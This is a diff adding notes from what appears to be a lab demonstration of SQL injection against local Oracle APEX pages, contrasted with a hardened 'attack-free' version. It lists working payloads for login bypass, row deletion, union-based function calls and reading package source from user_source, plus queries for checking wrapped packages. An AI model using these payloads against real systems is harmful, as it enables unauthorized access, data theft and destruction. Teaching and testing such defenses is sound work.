@@ -1,0 +1,80 @@
+
+
+--http://localhost:8080/apex/btspgsup.SQLATTACK_WEBPAGE.indexpage
+-- http://localhost:8080/apex/btspgsup.ELOG_WEBPAGE.indexpage
+
+
+BYPASS LOGIN:
+
+a' or rownum=1 and 'a'='a
+
+a' or rownum<2 and 'a'='a
+
+
+FROM CUTOMER SIDE:
+
+CODE INJECTION:
+
+CHENNAI'); delete from emp_tab where upper(USER_NAME)=upper('MEENAKSHI
+----------------------------------------------------
+FROM MANAGER SIDE:
+
+function call injection(orderid)
+
+1' union select '1',sqlattack_userdetails.insertprodtable('afake','afake','afake') ,'1','1','1',1,'1','1',sysdate from dual where 1 like '%
+
+accessing secure information:(product)
+
+Pen' union select '1',text ,'1','1','1',1,'1','1',sysdate from user_source where upper(name) like '%SECURE_PACKAGE
+
+
+---------------------------------------------------------
+IN ATTACKFREE WEBPAGE
+
+BYPASS LOGIN:
+
+a' or rownum<2 and 'a'='a
+
+Error occuring
+
+FROM CUTOMER SIDE:
+
+CODE INJECTION:
+
+CHENNAI'); delete from emp_tab where upper(USER_NAME)=upper('AARTHY
+
+can't  delete
+________________________________________________
+FROM MANAGER SIDE:
+
+As a original admin
+
+select product:
+
+Computer' union select '1',text ,'1','1','1',1,'1','1',sysdate from user_source where upper(name) like '%SECURE_PACKAGE
+ 
+select order id:
+
+8' union select '1',sqlattack_userdetails.insertprodtable('aaqa1','bbqa1','ccqa1') ,'1','1','1',1,'1','1',sysdate from dual where 1 like '%
+
+add'); delete from emp_tab where upper(user_id)=upper('1  
+
+program error
+____________________________________________________
+IN DATABASE WINDOW:
+
+WRAPPED PROCEDURE:
+
+IN EXISTING PACKAGE:
+
+  select * from all_source 
+   where type='PACKAGE' 
+   and owner='SPG' 
+   and name in ('SECURE_PACKAGE');
+
+IN OUR WRAPPED PACKGE
+
+  select * from all_source 
+   where type='PACKAGE' 
+   and owner='SPG' 
+   and name in ('ATTACKFREE_PACKAGE'); 
